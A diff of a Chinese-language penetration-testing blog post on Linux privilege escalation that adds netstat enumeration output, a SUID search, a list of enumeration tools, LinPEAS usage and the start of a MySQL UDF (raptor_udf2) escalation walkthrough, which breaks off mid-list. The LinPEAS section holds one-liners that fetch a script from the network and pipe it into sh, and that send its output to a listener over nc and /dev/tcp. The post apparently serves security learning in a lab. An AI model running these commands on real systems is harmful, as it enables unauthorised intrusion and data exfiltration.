@@ -46,7 +46,7 @@
 提权原理 常用权限体系 ugo 基本权限：文件权限和所有权，Linux 系统使用基于用户、组和其他用户的权限体系来控制对文件和目录的访问。此外，通过文件的所有者和所属设置，可以实现更细粒度的访问控制。 suid、sgid、sticky 权限：它们可以授予用户或组特定的权限，使得在特定的条件下可以执行一些非常有用的操作。前两者程序将以文件 所有者/所有组 的身份来执行，Sticky Bit 权限用于在共享文件夹中限制文件的删除权限。 Capabilities：Linux Capabilities 是一种将传统的全局权限分割为更小、独立的权限单元的机制，以便于应用程序和服务分配更细粒度的权限，限制潜在的安全风险。 AppArmor 和 SELinux：这两种安全模块通过强制访问控制（MAC）策略增强了系统的安全性。它们可以限制进程和文件的访问权限，从而降低潜在的安全风险。AppArmor 是 MAC 的实现，专为 Linux 系统设计。与 SELinux 不同，APPArmor 使用路径名来识别与保护系统资源，而不是安全上下文。AppArmor 通过定义所谓的 “配置文件”，为每个应用程序设定允许和禁止的操作，从而限制进程对系统资源的访问。AppArmor 相对于 SELinux 来说，更容易配置和管理，但在某些情况下可能不如 SELinux 强大。SELinux 是另一种 MAC 的实现。最初由美国国家安全局（NSA）开发，后来集成到许多 Linux 发行版本中。SELinux 通过为文件、进程等系统资源分配安全上下文（安全标签），并根据预先定义的安全策略规则来控制访问。SELinux 旨在防止恶意软件或由漏洞的应用程序造成的潜在损害，并限制了它们对系统资源的访问。 Access Control Lists（ACLs）：ACLs 提供了比传统文件权限更灵活的权限管理方式，允许为特定用户和组分配文件或目录的特定权限。 其他 20 个权限体系和安全机制 Grsecurity：是一套安全补丁和配置系统，用于 Linux 内核，旨在增强系统的安全性。它包括许多功能，如控制访问、内存保护以及提供系统的稳定性 Grsecurity 通过实现强制访问控制、内存保护以及其他特性，从而降低攻击者利用漏洞的机会。 PaX：是一种用于 Linux 内核的内存保护补丁。它旨在防止攻击者利用内存错误，如缓冲区溢出等漏洞。PaX 主要通过两种技术实现保护：地址空间布局随机化（ASLR）和非可执行内存页。这两种技术互相配合，能有效防止攻击者执行恶意代码。 polkit（PolicyKit）：是一个用于操作系统级别权限的控制框架，它允许非特权用户执行特权操作。它为应用程序提供了一种有限的授权，使其能够执行需要特权的操作，而无需提升整个应用程序的权限。 Execshield：是一种 Linux 内核安全特性，由 Red Hat 公司开发。他的目标是防止缓冲区溢出攻击和其他相关的漏洞利用。Exeshield 的主要功能包括使栈和堆不可执行、随机化内存布局和限制内核态代码的执行。 ASLR：ASLR（Address Space Layout Randomization）是一种内存保护技术，用于随机化程序在内存中的地址空间布局。使得攻击者更难预测恶意代码的地址，降低了攻击的可能性。ASLR 可以应用于操作系统内核和用户程序，增强整个系统的安全性。 TOMOYO Linux：TOMOYO Linux 是一种用于 Linux 内核的强制访问控制（MAC）安全模块，与 SELinux 和 AppArmor 类似。它通过轻量级的配置和易于理解的策略语法，帮助管理员管理程序和访问权限。 SMACK（Simplified Mandatory Access Control Kernel）：SMACK 是一种基于 Linux 的简化强制访问控制内核。它通过为程序分配安全标签来限制进程间通信和文件访问。SMACK 旨在实现简单易用的访问控制策略。 IMA（Integrity Measurement Architecture）：IMA 是一种 Linux 安全模块，用于确保文件的完整性。它通过对文件生成数字签名并将其与文件一起储存，以确保文件没有被篡改。IMA 可以与其他安全框架（如 SELinux 或 AppArmor）配合使用，提供更全面的系统安全保护。 Yama：Yama 是一种 Linux 安全模块，用于实施一些基本的系统安全策略，例如限制进程跟踪功能。Yama 的目的是提供一些额外的保护措施，以降低潜在漏洞的影响。 CGroups（Control Groups）：CGroups 是一种 Linux 内核功能，允许将进程分组分配资源（如 CPU、内存和磁盘空间）。虽然 CGroups 主要用于资源管理，但它也可以用于隔离进程，提高系统安全性。 Linux Namespaces：Namespaces 是一种 Linux 内核特性，用于隔离进程的运行环境。Namespaces 可以限制进程访问其他进程、文件系统和网络资源，从而提高系统安全性。 StackGuard：StackGuard 是一种编译器扩展，用于防止缓冲区溢出攻击。它在栈帧中插入一个 “canary” 值，以检测潜在的栈溢出。如果 “canary” 值被篡改，程序会在攻击者获得执行权限之前终止，从而阻止攻击。 ProPolice：Propolice（也称为 SSP，Stack Smashing Protector）是另一种编译器扩展，类似于 StackGuard。它也在栈帧中插入 “canary” 值，以防止缓冲区溢出攻击。ProPolice 同时还对局部变量进行重新排序，以减小攻击成功的可能性。 seccomp：seccomp（安全计算模式）是一种 Linux 内核功能，允许进程限制其系统调用的使用。通过使用 seccomp，程序可以限制其对系统资源的访问，从而提高安全性。seccomp 通常与沙箱技术和容器一起使用，为应用程序提供隔离的运行环境。 ptrace：ptrace 是一种允许一个进程观察和控制另一个进程的执行的 Linux 系统调用。虽然 ptrace 通常用于调试目的，但它也可用于实现沙箱和其他安全措施。然而，ptrace 本身可能会被攻击者利用，因此需要谨慎使用。 Capsicum：Capsicum 是一种为 Unix-like 系统（如 FreeBSD 和 Linux）提供沙箱和能力分离的安全框架。它允许程序将自己限制在受限的沙箱环境中运行，从而降低潜在漏洞的影响。 MPROTECT：MPROTECT 是一种用于标记内存页为只读或不可执行的内核功能。它可以防止攻击者将数据区域（如堆和栈）用于执行恶意代码。MPROTECT 通常与其他内存保护技术（如 ASLR 和 PaX ）一起使用，提高系统安全性。 Mandatory Access Control（MAC）：强制控制访问是一种安全策略，强制执行访问控制规则。与自主访问控制（Discretionary Access Control，DAC）相比，MAC 更严格地限制了对象（如文件和进程）之间的交互。AppArmor 和 SELinux 就是 MAC 地实现。 Chroot：Chroot 是一种将进程限制在文件系统地子目录中运行地技术，从而限制进程访问系统中的其他部分。尽管 Chroot 可以提供一定程度的隔离，但它并不是一个完全安全的沙箱解决方案。 Firejail：Firejail 是一种用于 Linux 和其他 Unix-like 系统的沙箱工具。它允许将程序限制在一个受限的运行环境中，以减少潜在的安全风险。Firejail 可以与 seccomp、namespaces、CGroups 等内核功能结合使用，以提供更强大的隔离和安全保护。 Kernel Address Space Layout Randomization（KASLR）：KASLR 是一种内核级别的地址空间布局随机化技术，用于随机化内核代码和数据在内存中的地址。KASLR 旨在防止攻击者利用内核漏洞，从而提高系统安全性。 Control Flow Integrity（CFI）：控制流完整性是一种用于检测和防止控制流劫持攻击（如返回导向编程和条约导向编程）的安全策略。CFI 可以在编译器和硬件层面实现，以保护程序免受此类攻击。 AddressSanitizer：AddressSanitzer 是一种用于检测内存错误（如缓冲区溢出和使用后释放）的编译器扩展。 AM（Pluggable Authentication Modules，可插入认证模块）是一种灵活的认证框架，用于在 Linux 和 UNIX 系统上实现各种认证策略。PAM 允许系统管理员在不修改已有程序的情况下，为各种应用程序和服务配置和管理认证方法。PAM 的核心概念是将认证过程分解为一系列可插入的模块，这些模块可以独立于应用程序进行更新和配置。这种分离使得管理员可以轻松地在系统中添加、删除或更改认证策略，而无需重新编译或修改应用程序。PAM 主要用于以下四个方面： 认证：验证用户身份，通常是通过检查用户输入的用户名和密码完成。PAM 模块可以支持各种不同地认证方法，如本地密码文件、LDAP、Kerberos 等。 账户管理：检查用户账户的访问权限，如密码过期、时间限制、IP 地址限制等。账户管理模块可以在用户通过认证后执行这些检查。 会话管理：管理用户登入会话。会话管理模块可以在用户登录和注销时执行特定的任务，如挂在家目录、设置环境变量等。 密码管理：处理用户密码更改和相关策略。密码管理模块可以强制实施密码复杂性规则、历史记录检查等。 提权原理 低权限可修改的执行文件或脚本，能以高权限身份允许。 从用户行为角度，用低权限用户的运维人员，也需要记忆、输入、备份凭据，以备使用高权限用户完成操作。 在权限的上层，捕捉、拦截、修改凭据信息或权限信息，如一些基于内存读取操作实现的内核利用。 Linux 提权枚举 终端升级与提高稳定性 在 Linux 目标获得立足点时，首先应该尝试的是将 shell 升级为完整的 TTY（交互式 shell）。">
   <meta itemprop="datePublished" content="2026-01-05T12:00:00+08:00">
   <meta itemprop="dateModified" content="2026-01-05T12:00:00+08:00">
-  <meta itemprop="wordCount" content="1442">
+  <meta itemprop="wordCount" content="2186">
   <meta itemprop="keywords" content="Hack,技术">
 
   <meta name="twitter:card" content="summary">
@@ -125,7 +125,7 @@
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        7 minutes
+        11 minutes
 
         
       </p>
@@ -156,6 +156,14 @@
       <ul>
         <li><a href="#终端升级与提高稳定性">终端升级与提高稳定性</a></li>
         <li><a href="#手工枚举技术">手工枚举技术</a></li>
+        <li><a href="#自动化枚举">自动化枚举</a></li>
+        <li><a href="#linpeas-最佳实践">LinPEAS 最佳实践</a></li>
+      </ul>
+    </li>
+    <li><a href="#提权实战演示">提权实战演示</a>
+      <ul>
+        <li><a href="#mysql-udf">mysql-udf</a></li>
+        <li><a href="#可读-shadow-文件提权">可读 shadow 文件提权</a></li>
       </ul>
     </li>
   </ul>
@@ -477,8 +485,206 @@
 <p>在对现有的接口和网络路由进行初始检查后，值得查看现有通信。<code>netstat</code> 命令可以与几个不同选项一起使用，以收集有关现有连接信息。</p>
 <ul>
 <li>netstat -a：显示所有在监听的端口和已建立的连接。</li>
-<li></li>
+<li><code>netstat -at</code> / <code>netstat -ay</code>：列出 TCP 或 UDP 协议</li>
 </ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -at
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>servers and established<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:ssh                <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:*                  LISTEN     
+</span></span><span style="display:flex;"><span>                                                                                                       
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -au
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>servers and established<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+</span></span><span style="display:flex;"><span>udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 10.10.10.5:bootpc       10.10.10.254:bootps     ESTABLISHED
+</span></span></code></pre></div><ul>
+<li><code>netstat -l</code>：列出处于 “监听” 模式的端口</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -lt
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:ssh                <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:*                  LISTEN 
+</span></span></code></pre></div><ul>
+<li><code>netstat -s</code>：按协议列出网络使用统计数据</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -s 
+</span></span><span style="display:flex;"><span>Ip:
+</span></span><span style="display:flex;"><span>    Forwarding: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">29</span> total packets received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span> with invalid addresses
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> forwarded
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> incoming packets discarded
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">28</span> incoming packets delivered
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">34</span> requests sent out
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">40</span> dropped because of missing route
+</span></span><span style="display:flex;"><span>    OutTransmits: <span style="color:#ae81ff">34</span>
+</span></span><span style="display:flex;"><span>Icmp:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> ICMP messages received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> input ICMP message failed
+</span></span><span style="display:flex;"><span>    ICMP input histogram:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span> ICMP messages sent
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> ICMP messages failed
+</span></span><span style="display:flex;"><span>    ICMP output histogram:
+</span></span><span style="display:flex;"><span>        destination unreachable: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>IcmpMsg:
+</span></span><span style="display:flex;"><span>        OutType3: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Tcp:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span> active connection openings
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> passive connection openings
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span> failed connection attempts
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> connection resets received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> connections established
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">8</span> segments received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">8</span> segments sent out
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> segments retransmitted
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> bad segments received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span> resets sent
+</span></span><span style="display:flex;"><span>Udp:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">17</span> packets received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span> packets to unknown port received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> packet receive errors
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">23</span> packets sent
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> receive buffer errors
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> send buffer errors
+</span></span><span style="display:flex;"><span>    IgnoredMulti: <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>UdpLite:
+</span></span><span style="display:flex;"><span>TcpExt:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> packet headers predicted
+</span></span><span style="display:flex;"><span>IpExt:
+</span></span><span style="display:flex;"><span>    InMcastPkts: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    OutMcastPkts: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>    InBcastPkts: <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>    InOctets: <span style="color:#ae81ff">7893</span>
+</span></span><span style="display:flex;"><span>    OutOctets: <span style="color:#ae81ff">4871</span>
+</span></span><span style="display:flex;"><span>    InMcastOctets: <span style="color:#ae81ff">635</span>
+</span></span><span style="display:flex;"><span>    OutMcastOctets: <span style="color:#ae81ff">755</span>
+</span></span><span style="display:flex;"><span>    InBcastOctets: <span style="color:#ae81ff">234</span>
+</span></span><span style="display:flex;"><span>    InNoECTPkts: <span style="color:#ae81ff">29</span>
+</span></span><span style="display:flex;"><span>MPTcpExt:
+</span></span></code></pre></div><ul>
+<li><code>netstat -tp</code>：列出服务名称和 PID 信息的连接</li>
+<li><code>netstat -i</code>：显示接口统计信息</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -i 
+</span></span><span style="display:flex;"><span>Kernel Interface table
+</span></span><span style="display:flex;"><span>Iface             MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
+</span></span><span style="display:flex;"><span>eth0             <span style="color:#ae81ff">1500</span>        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> BMRU
+</span></span><span style="display:flex;"><span>lo              <span style="color:#ae81ff">65536</span>        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> LRU
+</span></span></code></pre></div><ul>
+<li><code>netstat -ano</code>：显示所有套接字（a）、不解析名称（n）、显示计时器（o）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -ano
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>servers and established<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 10.10.10.5:68           10.10.10.254:67         ESTABLISHED off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>raw6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::58                   :::*                    <span style="color:#ae81ff">7</span>           off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Active UNIX domain sockets <span style="color:#f92672">(</span>servers and established<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto RefCnt Flags       Type       State         I-Node   Path
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         STREAM     CONNECTED     <span style="color:#ae81ff">16604</span>    
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         STREAM     CONNECTED     <span style="color:#ae81ff">13991</span>    /run/user/1000/bus
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         STREAM     CONNECTED     <span style="color:#ae81ff">13920</span>    /run/user/1000/bus
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         STREAM     CONNECTED     <span style="color:#ae81ff">15235</span>    /run/systemd/journal/stdout
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         DGRAM      CONNECTED     <span style="color:#ae81ff">6736</span>     
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         STREAM     CONNECTED     <span style="color:#ae81ff">11367</span>    /run/systemd/journal/stdout
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">2</span>      <span style="color:#f92672">[</span> ACC <span style="color:#f92672">]</span>     STREAM     LISTENING     <span style="color:#ae81ff">8700</span>     /run/systemd/journal/stdout
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         STREAM     CONNECTED     <span style="color:#ae81ff">6085</span>     
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">2</span>      <span style="color:#f92672">[</span> ACC <span style="color:#f92672">]</span>     STREAM     LISTENING     <span style="color:#ae81ff">8701</span>     /run/systemd/io.systemd.MuteConsole
+</span></span><span style="display:flex;"><span>......
+</span></span></code></pre></div><h4 id="find">find</h4>
+<p>下面是查找设置 SUID 位文件的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s type f 2&gt;/dev/null
+</span></span></code></pre></div><h4 id="which">which</h4>
+<ul>
+<li>whereis：用于查找二进制文件、源文件和 man 手册的位置。它只能查找系统默认路径中的文件，不会搜索其他目录或挂载的磁盘。</li>
+<li>which：查找命令所在的位置，并返回找到的第一个命令的完整路径，并返回找到的第一个命令的完整路径。他会在系统 PATH 环境变量中指定的目录中寻找，并返回找到的第一个可执行文件的路径。如果该命令在多个目录中都存在，则只返回最先找到的那个命令的位置。因此，which 命令通常用于查找可执行文件的位置。</li>
+<li>locate：使用本地数据库来快速查找指定位置，不会实时更新文件系统，使用可能会出现找不到文件的情况，为了保证正确的，可以使用 <code>updatedb</code> 命令更新数据库。</li>
+<li>type：用于查找命令是否内置命令、外部命令还是别名。如果是内置命令则返回 ”builtin“，如果是外部命令则返回可执行文件的位置，如果是别名则返回别名定义的命令。</li>
+<li>apropos：用于在系统的 man 手册中搜索与指定关键词相关的条目。它可以帮助用户快速找到特定主题或命令相关手册页。</li>
+<li>find：用于在指定路径下递归搜索符合条件的文件。它可以根据文件名、文件类型、文件大小、文件权限等条件来搜索文件。</li>
+<li>grep：用于在指定文件中查找符合条件的字符串。支持正则表达式，可快速查找文本文件中的关键词。</li>
+<li>where：与 which 类似，但他可以同时查找多个命令，而 which 只能查找单个命令。where 命令会在系统 PATH 环境变量中指定的所有目录中寻找，并放回找到的所有命令的位置。如果该命令在多个目录中都存在则会返回所有找到命令的位置。</li>
+</ul>
+<h4 id="etcfstab">/etc/fstab</h4>
+<p>检测未挂载的文件系统。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat etc/fstab
+</span></span></code></pre></div><h3 id="自动化枚举">自动化枚举</h3>
+<h4 id="常用工具">常用工具</h4>
+<ul>
+<li>LinPEAS：全称为 Linux Privilege Awesome Script，是一个用来搜索类 unix 主机上可能的提权路径的自动化脚本。</li>
+<li>LinEnum：一个流行的 Linux 本地枚举脚本，用于收集有关系统的各种信息，识别不安全配置，提取可用于提升权限的漏洞信息。</li>
+<li>linux-smart-enumeration（lse）：一个具有模块化功能的 Linux 本地枚举脚本。</li>
+<li>linux-exploit-suggester：用于识别 Linux 系统中可能存在的可利用漏洞。</li>
+<li>Linuxprivchecker：检查 Linux 系统潜在安全问题的 python 脚本。</li>
+<li>unix-privese-check：识别类 UNIX 系统中可能的权限提升路径。</li>
+</ul>
+<h3 id="linpeas-最佳实践">LinPEAS 最佳实践</h3>
+<p>使用 <code>curl</code> 直接从 Github 中执行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+</span></span></code></pre></div><p>使用 wget 下载后给权限单独执行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># 本地网络下载 </span>
+</span></span><span style="display:flex;"><span>sudo python3 -m http.server <span style="color:#ae81ff">80</span> <span style="color:#75715e">#kali </span>
+</span></span><span style="display:flex;"><span>curl 10.10.10.5/linpeas.sh | sh <span style="color:#75715e">#靶机 </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 从内存中执行，结果发回kali </span>
+</span></span><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">81</span> | tee linpeas.out <span style="color:#75715e">#kali </span>
+</span></span><span style="display:flex;"><span>curl 10.10.10.10/linpeas.sh | sh | nc 10.10.10.10 <span style="color:#ae81ff">81</span> <span style="color:#75715e">#靶机 </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 没有curl的情况 </span>
+</span></span><span style="display:flex;"><span>sudo nc -q <span style="color:#ae81ff">5</span> -lvnp <span style="color:#ae81ff">80</span> &lt; linpeas.sh <span style="color:#75715e">#kali </span>
+</span></span><span style="display:flex;"><span>cat &lt; /dev/tcp/10.10.10.10/80 | sh <span style="color:#75715e">#靶机</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出到文件 </span>
+</span></span><span style="display:flex;"><span>./linpeas.sh -a &gt; /dev/shm/linpeas.txt <span style="color:#75715e">#主机 </span>
+</span></span><span style="display:flex;"><span>less -r /dev/shm/linpeas.txt <span style="color:#75715e">#读取分色文件</span>
+</span></span></code></pre></div><p>使用 LinePEAS 二进制文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas_linux_amd64 chmod +x linpeas_linux_amd64 ./linpeas_linux_amd64
+</span></span></code></pre></div><h2 id="提权实战演示">提权实战演示</h2>
+<h3 id="mysql-udf">mysql-udf</h3>
+<p>使用 mysql 用户自定义函数提权，udf 是 User-Defined Function（用户自定义函数），可以在 SQL 查询中使用，类似于内置函数。通过使用 UDF 用户可以对数据库执行自定义操作，从而满足特定业务需求。用户自定义函数通常用于处理复杂的数据操作，简化查询，或者实现数据库本身不支持的特定功能。这是 mysql 数据库自带的功能，无需特定设置。</p>
+<h4 id="提权条件">提权条件</h4>
+<ol>
+<li>掌握 mysql 数据库的账户：该账户对 mysql 用于 <code>create</code>、<code>insert</code>、<code>delete</code> 等权限，以创建和使用函数（最好是 root 账户）。</li>
+<li>secure_filr_priv 为空：使用命令 <code>show variables like '%secure_file_priv%'</code> 查看，<code>secure_file_priv</code> 是 mysql 系统变量，用于限制 <code>LOAD DATA</code>、<code>SELECT ... INTO OUTFILE</code>、<code>LOAD_FILE()</code> 等文件操作范围，它可以限制这些操作仅在特定目录下进行以增强系统的安全性。当 <code>secure_file_priv</code> 设置为一个非空目录路径时，这些操作仅允许在指定目录下进行。</li>
+</ol>
+<h4 id="准备利用条件">准备利用条件</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gcc -g -c raptor_udf2.c -fPIC
+</span></span></code></pre></div><ul>
+<li>-g：生成调试信息</li>
+<li>-c：指示编译器仅编译源码，但不进行链接</li>
+<li>-fPIC：告诉编译器生成位置无关代码（Position-Independent Code，PIC），这种代码可以在内存中的任意位置执行</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+</span></span></code></pre></div><ul>
+<li>-shared：生成一个共享库文件而非可执行文件</li>
+<li>-Wl：将后面的选项传递给链接器</li>
